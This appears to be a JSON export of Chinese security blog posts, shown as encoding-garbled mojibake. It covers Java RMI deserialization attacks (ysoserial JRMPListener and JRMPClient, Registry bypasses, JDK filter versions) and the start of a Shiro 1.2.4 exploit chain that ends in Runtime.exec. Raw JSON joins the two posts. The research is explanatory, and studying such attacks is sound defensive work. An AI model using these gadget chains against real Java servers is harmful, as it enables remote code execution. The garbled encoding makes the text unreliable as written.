æœ€ç»ˆç”±DGCClientå‘èµ·è¿æ¥ï¼Œä¸‹å›¾ä¸­çš„loopupå‡½æ•° åˆ°è¿™é‡Œåé¢å°±æ˜¯JRMPListenerååºåˆ—åŒ–çš„ä¸œè¥¿äº†ï¼Œè¿™é‡Œåœ¨æœ€åè¿›è¡Œåˆ†æã€‚ 3. RMIConnectionImpl_Stubå¯¹è±¡å‰é¢æåˆ°äº†ä¸¤ç§æ€è·¯ï¼Œè¿˜æœ‰ä¸€ç§å°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªå®ç°äº†Remoteæ¥å£å¹¶ä¸”å°è£…äº†refçš„å¯¹è±¡ï¼Œè¿™é‡ŒRMIConnectionImpl_Stubå¯¹è±¡å°±æ˜¯ RemoteObjectInvocationHandleråç»­çš„è§¦å‘ä¸»è¦ä¾é RemoteObjectå¯¹è±¡çš„readObjectå‡½æ•°çš„é‡æ–°å¡«å……ï¼Œè€ŒRMIConnectionImpl_Stubå¯¹è±¡ä¹Ÿç»§æ‰¿äº†RemoteObjectæ‰€ä»¥åé¢çš„ä¸€äº›è°ƒç”¨è¿‡ç¨‹è·Ÿç¬¬äºŒä¸ªå¯¹è±¡ä¸€æ ·ï¼Œä¸å†å™è¿°ã€‚ å…¶å®é¡ºç€æ€è·¯æ‰¾è¿˜èƒ½å‘ç°DGCImpl_Stubã€RMIServerImpl_Stubã€RegistryImpl_Stubã€ReferenceWrapper_Stubéƒ½å¯ä»¥ 0x04 åç»­ï¼ˆé™¤äº†ä¸‹é¢çš„é™åˆ¶å¤–ï¼Œä¹Ÿå°±141åç»­ç‰ˆæœ¬æ˜¯æ— æ³•è¿›è¡Œè¿œç¨‹åˆ©ç”¨çš„ï¼Œåªèƒ½åœ¨æœ¬åœ°è¿›è¡Œåˆ©ç”¨ï¼‰ å…¶å®åˆ°æœ€æ–°ç‰ˆçš„jdk8ä»ç„¶æ²¡æœ‰å¤„ç†è¿™ä¸ªç»•è¿‡çš„é—®é¢˜ï¼Œæ˜¯ä¸æ˜¯å¾ˆå¼€å¿ƒï¼Ÿ è™½ç„¶æ²¡æœ‰è§£å†³rmiæœåŠ¡ç«¯çš„ååºåˆ—åŒ–ï¼Œä½†æ˜¯åœ¨å‘èµ·æ–°çš„RMIè¿æ¥æ—¶ï¼Œsun/rmi/transport/DGCImpl_Stub.java#leaseFilter æ–°æ·»åŠ äº†å¯¹äºè¿”å›çš„åºåˆ—åŒ–å¯¹è±¡çš„è¿‡æ»¤æ¡ä»¶ï¼Œåªå…è®¸ä¸Šé¢çš„å‡ ç§ç±»å‹ï¼Œè€Œç°æœ‰çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾ä¸­HashSetã€HashTableç­‰ç±»éƒ½æ˜¯é€šä¸è¿‡çš„ã€‚ä¹Ÿå°±æ„å‘³ç€JRMPè¿™ç§åˆ©ç”¨æ–¹å¼åœ¨jdk8u232_b09åŠä»¥ä¸Šçš„ç‰ˆæœ¬éƒ½æ˜¯ä¸è¡Œçš„ï¼ˆåœ¨è°ƒç”¨dirtyçš„æ—¶å€™æ³¨å†Œäº†leaseFilterï¼‰ã€‚ ps: å…¶å®ä¸Šè¯‰çš„è¿‡æ»¤å¾ˆæ—©å°±æœ‰äº†ï¼Œç”šè‡³è¿˜è·Ÿä¸¥æ ¼ï¼Œä½†æ˜¯ä»–çš„ç”Ÿæ•ˆä»…åœ¨jdk8u232_b09ä¸Šï¼Œè§http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/523d48606333#l4.38 ps:è¿™é‡Œç”¨çš„DGCImpl_Stubç›¸å¯¹åº”çš„è¿˜æœ‰æ¥æ”¶Clientå‘èµ·çš„è¿æ¥çš„å¤„ç†DGCImpl_Skelï¼Œskelè¿™é‡Œä¹Ÿå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œå…·ä½“è§0x08 0x05 ç•ªå¤–ï¼šysoserialä¸­çš„JRMPListenerä¸JRMPClientçœ‹äº†ä¸Šé¢å¯èƒ½ä½ ä¼šç–‘æƒ‘ï¼Œä¸ºä»€ä¹ˆserverç«¯å‘èµ·ä¸€ä¸ªRMIçš„è¿æ¥å°±ä¼šè§¦å‘javaååºåˆ—åŒ–ï¼Ÿ å‰æ–‡æˆ‘ä»¬å°†çš„æ˜¯RMI Registryåœ¨æ¥æ”¶è¿œç¨‹ç»‘å®šå¯¹è±¡æ—¶æ‰€å‘ç”Ÿçš„ååºåˆ—åŒ–æ¼æ´ï¼Œé‚£ä¹ˆRMI Clientåœ¨æ¥æ”¶Serverç«¯çš„æ•°æ®æ—¶æ˜¯å¦ä¹Ÿä¼šå‘ç”Ÿååºåˆ—åŒ–æ¼æ´å‘¢ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œæ¯•ç«ŸRMIäº¤äº’è¿‡ç¨‹ä¸­çš„æ•°æ®é‡‡ç”¨çš„æ˜¯åºåˆ—åŒ–çš„æ•°æ®ï¼Œä¹Ÿå°±æ„å‘³ç€å­˜åœ¨ç€ä¸€ä¸ªååºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚ çœ‹ä¸€ä¸‹JRMPListenerçš„ä»£ç ï¼Œç®€å•æ¥è¯´ï¼Œå…¶å®ç°äº†ä¸RMI Clientçš„äº¤äº’æµç¨‹ã€‚è¿™é‡Œæˆ‘ä»¬ç›´æ¥çœ‹é‡ç‚¹çš„ä»£ç  åœ¨å®Œæˆå‰é¢çš„ä¸€äº›äº¤äº’æ­¥éª¤åï¼ŒListenerä¼šå‘Clientå‘é€ä¸€ä¸ªExceptionalReturnçš„çŠ¶æ€ï¼Œå¹¶å°†åºåˆ—åŒ–çš„payloadå¡«å……åˆ°BadAttributeValueExpExceptionçš„valå±æ€§ã€‚è¿™é‡Œç”¨çš„BadAttributeValueExpExceptionå¹¶ä¸æ˜¯æˆ‘ä»¬ä»¥å‰åˆ†ææ—¶åšçš„toStringè§¦å‘ç‚¹ï¼Œè€Œæ˜¯ä»…ä½œä¸ºpayloadçš„ä¸€ä¸ªè½½ä½“ï¼Œåœ¨ååºåˆ—åŒ–BadAttributeValueExpExceptionçš„valå±æ€§æ—¶åŒæ ·ååºåˆ—åŒ–äº†æˆ‘ä»¬çš„payloadã€‚ è€Œä½äºClientåœ¨æ¥æ”¶åˆ°ExceptionalReturnæ—¶çš„å¤„ç†æ–¹å¼è§sun/rmi/transport/StreamRemoteCall.java#executeCallå‰é¢çš„åˆ†æéƒ½çœç•¥äº† åœ¨è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°äº†ç†Ÿæ‚‰çš„readObjectå‡½æ•°ï¼Œå…¶ç”¨äºå°†å‰é¢çš„Exceptionè¿›è¡Œååºåˆ—åŒ–ã€‚ åˆ°è¿™é‡Œå°±å¯ä»¥ä¸²èµ·æ¥äº†ï¼ŒClientå‘èµ·RMIè¿æ¥ï¼Œè¿æ¥åˆ°æˆ‘ä»¬çš„æ¶æ„Listenerä¸Šé¢ã€‚è€Œæˆ‘ä»¬çš„Listenerå°†è¿”å›ä¸€ä¸ªæ„é€ å¥½çš„Exceptionï¼Œæ—¨åœ¨Clientæ¥æ”¶åˆ°ExceptionalReturnçš„ä¿¡å·æ—¶è¿›è¡Œè¿˜åŸï¼Œä»è€Œé€ æˆäº†RMI Clientç«¯ä¹Ÿå—åˆ°ååºåˆ—åŒ–æ¼æ´çš„æ”»å‡»ã€‚ 0x06 æ€»ç»“å‰æ–‡ä¸»è¦è®²è¯‰äº†RMIçš„ç›¸å…³ååºåˆ—åŒ–é—®é¢˜ï¼ŒåŒ…æ‹¬RMI Registryå’ŒRMI Clientæ¥æ”¶åˆ°ååºåˆ—åŒ–æ•°æ®æ—¶äº§ç”Ÿçš„ååºåˆ—åŒ–æ¼æ´ã€‚ å…¨æ–‡æ‰€ä½¿ç”¨çš„JDKç‰ˆæœ¬ä¸ºJDK8ï¼Œåœ¨åˆ†æè¿‡ç¨‹ä¸­ï¼Œå‘ç°åœ¨æœ€è¿‘çš„JDK8uç‰ˆæœ¬ä¸Šï¼Œå·²æ— æ³•ä½¿ç”¨JRMPListenerçš„è¿™ç§æ–¹å¼æ¥åˆ©ç”¨äº†ï¼Œä½†å…¶åœ¨JDK8u232_b09ä¹‹å‰çš„ç‰ˆæœ¬è¿˜æ˜¯å¯ä»¥çš„ã€‚ æœ¬æ–‡ä¸»è¦æ”»å‡»çš„æ˜¯RMI Registryï¼Œè€ŒRMIçš„æ”»å‡»é¢ä¸å•å•æ–‡ä¸­æåˆ°çš„è¿™ç§æ–¹å¼ï¼Œè¿˜å­˜åœ¨ é’ˆå¯¹codebaseçš„æ”»å‡»è§https://github.com/vulhub/vulhub/blob/master/java/rmi-codebase/README.mdï¼ŒåŠ è½½æˆ‘ä»¬æ„é€ å¥½çš„classã€‚å½“ç„¶ç°åœ¨è¿™ç§æƒ…å†µæ¯”è¾ƒå°‘äº†ã€‚ é’ˆå¯¹ç»‘å®šçš„å±é™©objçš„æ”»å‡»ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡listæ‰€æœ‰ç»‘å®šçš„objï¼ŒæŸ¥æ‰¾å±é™©çš„ç»‘å®šåœ°å€è¿›è¡Œæ”»å‡»ã€‚è¿™é‡Œçš„å±é™©æ€ä¹ˆå®šä¹‰å‘¢ï¼Ÿç¬¬ä¸€æ˜¯ç»‘å®šçš„å¯¹è±¡ç¡®å®å­˜åœ¨æ“ä½œç³»ç»Ÿå‘½ä»¤ç­‰ï¼›ç¬¬äºŒæ˜¯è¯¥å¯¹è±¡çš„ç±»å‡½æ•°å‚æ•°ä¸­å­˜åœ¨ååºåˆ—åŒ–ç‚¹ï¼Œæ¯”å¦‚hello(HashTable xxx)ï¼Œå…¶ä¸­çš„HashTableæ˜¯CommonsCollections7çš„è§¦å‘ç‚¹ï¼Œåœ¨ä¼ é€’è¿‡ç¨‹ä¸­ï¼Œxxxä¼šè¢«åºåˆ—åŒ–ï¼Œåˆ°äº†RMI Serveræ—¶ä¼šååºåˆ—åŒ–ï¼Œä¹Ÿå°±æ‰§è¡Œäº†æˆ‘ä»¬çš„payloadã€‚æœ€åï¼Œè¿™é‡Œæš‚æ—¶è¿˜æ²¡æ‰¾åˆ°æ¡ˆä¾‹â€¦ 0x07 20200303æ›´æ–° UnicastRemoteObject Gadgetè¿™ä¸ªGadgetçš„æ¥æºæ˜¯https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/ ç»è¿‡æµ‹è¯•ï¼Œè¿™ä¸ªGadgetå¯ä»¥åšåˆ°è·ŸJRMPClientä¸€æ ·çš„æ•ˆæœï¼Œä½†æ˜¯æ— æ³•è·Ÿä¸Šé¢çš„Level2ä¸€æ ·ç»•è¿‡é™åˆ¶ï¼ŒåŸå› çœ‹ä¸‹é¢ æœ¬åœ°åœ¨bindæˆ–rebindä¸€ä¸ªRemoteå¯¹è±¡æ—¶ï¼Œä¼šåœ¨sun/rmi/server/MarshalOutputStream.java#replaceObjectè¿›è¡Œè½¬åŒ– åŸæ¥çš„å¯¹è±¡ä¼šè¢«è½¬åŒ–æˆä¸Šé¢çš„ä¸€ä¸ªç»“æ„ï¼Œè¿™é‡Œç›´æ¥ä¸¢æ‰äº†UnicastRemoteObjectï¼Œè‡ªç„¶åœ¨Registryç«¯æ— æ³•ä»UnicastRemoteObjectçš„readObjectå‡½æ•°å¼€å§‹ï¼Œè¿™æ ·è¿™ä¸ªGadgetå°±æ— æ³•æˆåŠŸåˆ©ç”¨äº†ã€‚ è¦æƒ³åˆ©ç”¨è¿™ä¸ªé“¾æ¥ç»•è¿‡é™åˆ¶ï¼Œæˆ‘ä»¬å¯èƒ½å¾—è‡ªå·±å†™ä¸€ä¸ªbindçš„è¿‡ç¨‹æ‰å¯ä»¥ï¼ŒæŠŠgetTargetçš„è¿‡ç¨‹å»æ‰ç›´æ¥å‘è¿‡å»ã€‚è¿™ä¸ªGadgetåˆ©ç”¨ä»·å€¼æ¯”è¾ƒä½XD 0x08 RMI DGCå®ç°é—®é¢˜(JRMPClient)åœ¨JEP290ä¹‹å‰ï¼ŒRMIçš„DGCImpl_skel#dipatchæ¥æ”¶å¤„ï¼Œè·å–åˆ°æ•°æ®åï¼Œç›´æ¥readObjecté€ æˆçš„ã€‚ åœ¨JEP290ä¹‹åï¼Œååºåˆ—åŒ–å‰åšäº†æ ¡éªŒï¼Œè§DGCImpl å¯¼è‡´äº†ysoserialçš„exploitä¸­çš„JRMPClientå¤±æ•ˆ 0x09 æ€»ç»“ä¸­ç¬¬äºŒç§æ–¹å¼çš„è§¦å‘ç‚¹ï¼ˆ20200317 æ›´æ–°ï¼‰å‰é¢æ€»ç»“ä¸­æåˆ°çš„ç¬¬äºŒä¸­æ–¹å¼ï¼šé€šè¿‡å¯»æ‰¾å¯ä»¥åˆ©ç”¨çš„ç»‘å®šå¯¹è±¡çš„å‡½æ•°çš„å‚æ•°è¿›è¡Œååºåˆ—åŒ–åˆ©ç”¨ ç›´æ¥è®²è§¦å‘ç‚¹sun/rmi/server/UnicastServerRef.java#dispatch#338 å½“æˆ‘ä»¬ç¼–å†™Clientç«¯å¯¹Serverç«¯æŒ‚è½½çš„å¯¹è±¡è¿›è¡Œè¿œç¨‹å‡½æ•°è°ƒç”¨ï¼ˆRMIï¼‰æ—¶ï¼ŒServerç«¯ä¼šé€ä¸€è¿›è¡Œï¼ˆè·å–åˆ°Methtodï¼Œè§£æparametersï¼Œæœ€åè¿›è¡Œinvokeè°ƒç”¨ï¼‰ã€‚è€Œåœ¨è§£æparamsæ—¶ï¼ˆæˆ‘ä»¬è®²è¿‡RMIè¿‡ç¨‹ä¸­ï¼Œå¯¹è±¡å‡æ˜¯åºåˆ—åŒ–çš„çŠ¶æ€ï¼‰æˆ‘ä»¬éœ€è¦å…ˆå¯¹å‚æ•°å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–ï¼Œä¹Ÿå°±æ˜¯ç¬¬338è¡Œæ‰€åšçš„å·¥ä½œï¼Œç»§ç»­å¾€ä¸‹è·Ÿ åœ¨å‡½æ•°unmarshalParametersUncheckedä¸­åˆ†åˆ«å¯¹æ¯ä¸ªå‚æ•°è¿›è¡Œååºåˆ—åŒ–è¿˜åŸ å¦‚æœæ‰€æ¥å—çš„ç±»å‹éåŸºç¡€æ•°æ®ç»“æ„ï¼Œé‚£ä¹ˆå°†ç›´æ¥è°ƒç”¨readObjectï¼Œè¿™éƒ¨åˆ†å¹¶æ²¡æœ‰å‰é¢filterçš„é™åˆ¶ æ‰€ä»¥å¦‚æœæ‰¾åˆ°äº†ä¸€ä¸ªServerç«¯æŒ‚è½½çš„å¯¹è±¡å­˜åœ¨å‡½æ•°å‚æ•°ç±»å‹ä¸ºObjectã€HashTableç­‰ç±»å‹æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ç©¿å…¥æ„é€ å¥½çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾ã€‚å½“å‰å‰æè¿˜æ˜¯Serverç«¯çš„ç¯å¢ƒä¸­å­˜åœ¨ç›¸åº”çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾çš„ä¾èµ–ã€‚"},{"title":"ã€notesã€‘Javaååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜ä¹‹Shiroååºåˆ—åŒ–","permalink":"http://blog.0kami.cn/2019/11/10/study-java-deserialized-shiro-1-2-4/","text":"0x00 å‰è¨€åœ¨è·Ÿäº†ä¸€écommons-collectionsç³»åˆ—çš„payloadåï¼Œç»ˆäºå¯ä»¥å¼€å§‹è§£å†³ä¸€ä¸‹å½“æ—¶å¯¹shiroååºåˆ—åŒ–æ¨¡å‡Œä¸¤å¯çš„è®¤è¯†äº†ã€‚ å½“å‰ï¼Œä¸ç®¡æ˜¯å›½å†…å®é™…çš„xxè¡ŒåŠ¨è¿˜æ˜¯ctfæ¯”èµ›ï¼Œshiroååºåˆ—åŒ–ä¼šç»å¸¸çœ‹åˆ°ã€‚ä½†åœ¨å®é™…åˆ©ç”¨è¿™ä¸ªæ¼æ´çš„æ—¶å€™ï¼Œä¼šå‘ç°æˆ‘ä»¬æ— æ³•åœ¨tomcatä¸‹ç›´æ¥åˆ©ç”¨shiroåŸç”Ÿçš„commons-collections:3.2.1ï¼ˆåŸå› åé¢è¯´ï¼‰ã€‚ æˆ‘ä»¬å‰é¢å·²ç»å¯¹commons-collectionsç³»åˆ—åˆ©ç”¨é“¾çš„åˆ†æï¼Œä»Šå¤©å°±æ¥æ ¹æ®å­¦åˆ°çš„çŸ¥è¯†æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ æœ¬æ–‡è®¨è®ºäº†shiro-1.2.4ç‰ˆæœ¬æ— æ³•ç›´æ¥åˆ©ç”¨ç°æœ‰çš„ysoserialåˆ©ç”¨é“¾ï¼Œå¹¶æå‡ºäº†ç›¸åº”çš„è§£å†³æ–¹æ¡ˆã€‚ 0x01 ç¯å¢ƒå‡†å¤‡è¿™é‡Œç”¨çš„æ˜¯shiro-root-1.2.4çš„samples/webç¯å¢ƒï¼Œcloneä¸‹æ¥åæ‰§è¡Œgit checkout shiro-root-1.2.4 åˆ©ç”¨è„šæœ¬å‚è€ƒçš„çŸ¥é“åˆ›å®‡çš„ä¸€ç¯‡åˆ†æ ysoserialç”¨çš„0.0.6ç‰ˆæœ¬https://github.com/frohoff/ysoserial å…ˆæ¥è®²ä¸€ä¸‹ï¼Œå…³äºç¯å¢ƒæ–¹é¢é‡åˆ°çš„å‘ï¼š åœ¨éƒ¨ç½²è¿‡ç¨‹ä¸­ï¼Œé‡åˆ°äº†The absolute uri: http://java.sun.com/jsp/jstl/core cannot be resolved in either web.xml or the jar files deployed with this applicationçš„é”™è¯¯ è¿™é‡Œçš„è§£å†³æ–¹æ¡ˆæ˜¯ä¿®æ”¹pom.xml â€‹ æ·»åŠ jstlçš„å…·ä½“ç‰ˆæœ¬å³å¯è§£å†³ã€‚ serialVersionUIDä¸ä¸€è‡´å¯¼è‡´æ— æ³•ååºåˆ—åŒ–çš„é—®é¢˜ è¿™é‡Œå¯èƒ½åœ¨ä½ çš„å®éªŒç¯å¢ƒä¸‹ä¸ä¸€å®šä¼šé‡åˆ°ï¼Œæˆ‘çš„å®éªŒç¯å¢ƒå’Œysoserialç”Ÿæˆçš„æŸå‡ ä¸ªç±»çš„serialVersionUIDä¸ä¸€è‡´ï¼Œå¯¼è‡´æ— æ³•æ­£å¸¸ååºåˆ—åŒ–ã€‚åœ¨å®æˆ˜ä¸­ä½ å¯ä»¥é‡‡ç”¨è¿™ç¯‡æ–‡ç« å¤„ç†æ–¹æ³•ï¼Œè¿™é‡Œæˆ‘çš„è§£å†³æ–¹æ¡ˆæ˜¯ç›´æ¥åŒæ­¥ä¸ªcommons-collections:3.2.1ç‰ˆæœ¬ï¼Œåœ¨ç”ŸæˆwaråŒ…å‰ï¼Œåœ¨pom.xmlåŠ å…¥ 123456&lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt;&lt;/dependency&gt; 0x02 å‰æ™¯å›é¡¾16å¹´çš„æ—¶å€™ï¼Œshiroçˆ†å‡ºäº†ä¸€ä¸ªé»˜è®¤keyçš„ååºåˆ—åŒ–æ¼æ´ã€‚è‡³ä»Šå·²æœ‰å¤§é‡çš„åˆ†ææ–‡ç« åˆ†æäº†è¯¥æ¼æ´çš„åŸç†ï¼Œæ‰€ä»¥æœ¬æ–‡ä¸å†é‡å¤åˆ†æè¯¥æ¼æ´çš„ç›¸å…³åŸç†ï¼Œå¯ä»¥å‚è€ƒä»¥ä¸‹å‡ ç¯‡æ–‡ç« çš„åˆ†æï¼š 1.https://blog.knownsec.com/2016/08/apache-shiro-java/ 2.https://blog.zsxsoft.com/post/35 3.http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html é™¤äº†1ä¸­åœ¨æ¼æ´ç¯å¢ƒä¸‹æ·»åŠ äº†commons-collections:4.0ï¼Œå¦å¤–ä¸¤ç¯‡æ–‡ç« å‡æåˆ°äº†åœ¨tomcatä¸‹æ— æ³•ç›´æ¥åˆ©ç”¨commons-collections:3.2.1çš„é—®é¢˜ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬å°±æ¥çœ‹çœ‹æ˜¯ä»€ä¹ˆåŸå› å§ï¼šï¼‰ org.apache.shiro.io.DefaultSerializer.deserialize:67 è¿™é‡Œæˆ‘ä»¬ç›´æ¥çœ‹ååºåˆ—åŒ–å‘ç”Ÿçš„ç‚¹ï¼Œç¬¬75è¡Œä½¿ç”¨äº†ClassResolvingObjectInputStreamç±»è€Œéä¼ ç»Ÿçš„ObjectInputStream.è¿™é‡Œå¯èƒ½æ˜¯å¼€å‘äººå‘˜åšçš„ä¸€ç§é˜²æŠ¤æªæ–½ï¼Ÿä»–é‡å†™äº†ObjectInputStreamç±»çš„resolveClasså‡½æ•°ï¼Œæˆ‘æ›¾åœ¨ç¬¬ä¸€ç¯‡åŸºç¡€æ–‡ç« ä¸­åˆ†æè¿‡Javaååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼ŒObjectInputStreamçš„resolveClasså‡½æ•°ç”¨çš„æ˜¯Class.forNameç±»è·å–å½“å‰æè¿°å™¨æ‰€æŒ‡ä»£çš„ç±»çš„Classå¯¹è±¡ã€‚è€Œé‡å†™åçš„resolveClasså‡½æ•° é‡‡ç”¨çš„æ˜¯ClassUtils.forNameï¼Œæˆ‘ä»¬ç»§ç»­çœ‹è¿™ä¸ªforNameçš„å®ç°ã€‚ æ¥çœ‹çœ‹è¿™ä¸ªExceptionIgnoringAccessoræ˜¯æ€ä¹ˆå®ç°çš„ è¿™é‡Œå®é™…ä¸Šè°ƒç”¨äº†ParallelWebAppClassLoaderçˆ¶ç±»WebappClassLoaderBaseçš„loadClasså‡½æ•°ï¼ˆå¯ä»¥ç›´æ¥ä¸‹æ–­ç‚¹çœ‹çœ‹å†…å®¹ï¼‰ã€‚ è¯¥loadClassè½½å…¥æŒ‰ç…§ä¸Šè¿°çš„é¡ºåºï¼ˆè¿™é‡Œä¸è´´ä»£ç äº†ï¼Œæ‰¾åˆ°org.apache.catalina.loader.WebappClassLoaderBase.loadClasså³å¯ï¼‰ï¼Œå…ˆä»cacheä¸­æ‰¾å·²è½½å…¥çš„ç±»ï¼Œå¦‚æœå‰3ç‚¹éƒ½æ²¡æ‰¾åˆ°ï¼Œå†é€šè¿‡çˆ¶ç±»URLClassLoaderçš„loadClasså‡½æ•°è½½å…¥ã€‚ä½†æ˜¯å®é™…ä¸Šæ­¤æ—¶loadClassçš„å‚æ•°nameå€¼å¸¦ä¸Šäº†æ•°ç»„çš„æ ‡å¿—ï¼Œå³/Lorg/apache/commons/collections/Transformer;.classï¼Œåœ¨å‚è€ƒçš„ç¬¬äºŒç¯‡æ–‡ç« é‡Œæœ‰æåˆ°è¿™ä¸ªé—®é¢˜ï¼Œæ‰€ä»¥å¯¼è‡´shiroæ— æ³•è½½å…¥æ•°ç»„ç±»å‹çš„å¯¹è±¡ã€‚ é‚£ä¹ˆå¦‚ä½•æ‰èƒ½çœŸæ­£çš„åˆ©ç”¨commons-collections:3.2.1æ¥æ„é€ åˆ©ç”¨é“¾å‘¢ï¼Ÿ é¦–å…ˆï¼Œåœ¨å‚è€ƒçš„ç¬¬ä¸€ç¯‡æ–‡ç« é‡Œï¼Œä½œè€…åœ¨ç¯å¢ƒä¸­å¼•å…¥äº†commons-collections:4.0ï¼Œä½¿å¾—ysoserialçš„CommonsCollections2åˆ©ç”¨é“¾å¯ä»¥æˆåŠŸåˆ©ç”¨ã€‚è¿™æ˜¯å› ä¸ºCommonsCollections2ç”¨çš„æ˜¯éæ•°ç»„å½¢å¼çš„åˆ©ç”¨é“¾ï¼Œåœ¨è¯¥åˆ©ç”¨é“¾ä¸Šæ²¡æœ‰å‡ºç°æ•°ç»„ç±»å‹çš„å¯¹è±¡ï¼Œè¿™ä½¿å¾—åœ¨shiroçš„ç¯å¢ƒä¸‹ï¼Œå¯ä»¥æ­£ç¡®æ‰§è¡Œå‘½ä»¤ã€‚ é‚£ä¹ˆï¼Œé—®é¢˜æ¥äº†ï¼Œæˆ‘ä»¬æ˜¯å¦èƒ½æ„é€ å‡ºä¸€ä¸ªåœ¨commons-collections:3.2.1ä¸‹å¯ä»¥åˆ©ç”¨ï¼Œå¹¶ä¸”åœ¨åˆ©ç”¨é“¾ä¸Šä¸å­˜åœ¨æ•°ç»„ç±»å‹çš„å¯¹è±¡ï¼Ÿç­”æ¡ˆå½“ç„¶æ˜¯è‚¯å®šçš„ï¼šï¼‰ 0x03 æ–°åˆ©ç”¨é“¾æ„é€ æ ¹æ®0x02çš„ä»‹ç»ï¼Œæˆ‘ä»¬å¯ä»¥æ¸…æ¥šçš„æ˜¯åˆ©ç”¨é“¾ä¸­çš„ChainedTransformerè¿™ä¸ªç±»çš„åˆ©ç”¨æ˜¯æ— æ³•æˆåŠŸçš„ï¼Œå› ä¸ºä»–çš„ç±»å±æ€§iTransformersæ˜¯æ•°ç»„ç±»å‹çš„Transformersï¼Œä¹Ÿå°±æ˜¯åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿçš„ClassNotFoundExceptionã€‚ å¦‚æœä½ çœ‹è¿‡å‰å‡ ç¯‡å…³äºcommons-collectionsç³»åˆ—çš„payloadåˆ†æï¼Œé‚£ä¹ˆä½ è‚¯å®šå¯ä»¥å›å¿†èµ·æ¥ï¼Œé™¤äº†åˆ©ç”¨ChainedTransformerè¿™ç§æ–¹å¼ï¼Œè¿˜å¯ä»¥ä½¿ç”¨TemplatesImpl.newTransformerå‡½æ•°æ¥åŠ¨æ€loadClassæ„é€ å¥½çš„evil class bytesï¼ˆè¿™ä¸€éƒ¨åˆ†ä¸å¤è¿°äº†ï¼Œå¯ä»¥çœ‹å‰é¢çš„æ–‡ç« ï¼‰ã€‚å¹¶ä¸”åœ¨è¿™éƒ¨åˆ†åˆ©ç”¨é“¾ä¸Šæ˜¯ä¸å­˜åœ¨æ•°ç»„ç±»å‹çš„å¯¹è±¡çš„ã€‚ é‚£ä¹ˆï¼Œæ¥ä¸‹æ¥çš„é‡ç‚¹å°±æ˜¯æ‰¾ä¸€ä¸ªå¦‚ä½•è§¦å‘TemplatesImpl.newTransformerçš„æ–¹æ³•äº†ï¼šï¼‰ æˆ‘ä»¬å…ˆæ¥å›é¡¾ä¸€ä¸‹CommonsCollections2çš„åˆ©ç”¨é“¾ 123456789PriorityQueue.readObject -&gt; PriorityQueue.heapify() -&gt; PriorityQueue.siftDown() -&gt; PriorityQueue.siftDownUsingComparator() -&gt; TransformingComparator.compare() -&gt; InvokerTransformer.transform() -&gt; TemplatesImpl.newTransformer() ... templates Gadgets ... -&gt; Runtime.getRuntime().exec() åœ¨è¿™æ¡é“¾ä¸Šï¼Œç”±äºTransformingComparatoråœ¨3.2.1çš„ç‰ˆæœ¬ä¸Šè¿˜æ²¡æœ‰å®ç°Serializableæ¥å£ï¼Œå…¶åœ¨3.2.1ç‰ˆæœ¬ä¸‹æ˜¯æ— æ³•ååºåˆ—åŒ–çš„ã€‚æ‰€ä»¥æˆ‘ä»¬æ— æ³•ç›´æ¥åˆ©ç”¨è¯¥payloadæ¥è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„ç›®çš„ã€‚ é‚£ä¹ˆå°±æ¥æ”¹é€ æ”¹é€ å§ï¼æˆ‘ä»¬å…ˆå°†æ³¨æ„åŠ›å…³æ³¨åœ¨InvokerTransformer.transform()ä¸Š è¿™é‡Œæ˜¯æœ€ç»å…¸çš„åå°„æœºåˆ¶çš„å†™æ³•ï¼Œæ ¹æ®ä¼ å…¥çš„inputå¯¹è±¡ï¼Œè°ƒç”¨å…¶iMethodNameï¼ˆå¯æ§ï¼‰ã€‚é‚£ä¹ˆå¦‚æœæ­¤æ—¶ä¼ å…¥çš„inputä¸ºæ„é€ å¥½çš„TemplatesImplå¯¹è±¡å‘¢ï¼Ÿ å¾ˆæ˜æ˜¾ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å°†iMethodNameç½®ä¸ºnewTransformerï¼Œä»è€Œå®Œæˆåç»­çš„templates gadgetsã€‚ é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæ€ä¹ˆå°†ä¼ å…¥çš„inputç½®ä¸ºTemplatesImplå¯¹è±¡å‘¢ï¼Ÿ åœ¨ysoserialçš„åˆ©ç”¨é“¾ä¸­ï¼Œå…³äºtransformå‡½æ•°æ¥æ”¶çš„inputå­˜åœ¨ä¸¤ç§æƒ…å†µã€‚ 1.é…åˆChainedTransformerInvokerTransformerå¾€å¾€åŒChainedTransformeré…åˆï¼Œå¾ªç¯æ„é€ Runtimt.getRuntime().execã€‚å¾ˆæ˜æ˜¾ï¼Œè¿™é‡Œæˆ‘ä»¬æ— æ³•åˆ©ç”¨äº†ã€‚ 2.æ— æ„ä¹‰çš„Stringè¿™é‡Œçš„æ— æ„ä¹‰çš„StringæŒ‡çš„æ˜¯ä¼ å…¥åˆ°ConstantTransformer.transformå‡½æ•°çš„inputï¼Œè¯¥transformå‡½æ•°ä¸ä¾èµ–inputï¼Œè€Œç›´æ¥è¿”å›iConstant è¿™é‡Œç¬¬ä¸€æ¡è·¯è‚¯å®šæ–­äº†ï¼Œé‚£ä¹ˆå°±æ˜¯æ€ä¹ˆåˆ©ç”¨è¿™ä¸ªæ— æ„ä¹‰çš„Stringäº†ï¼ 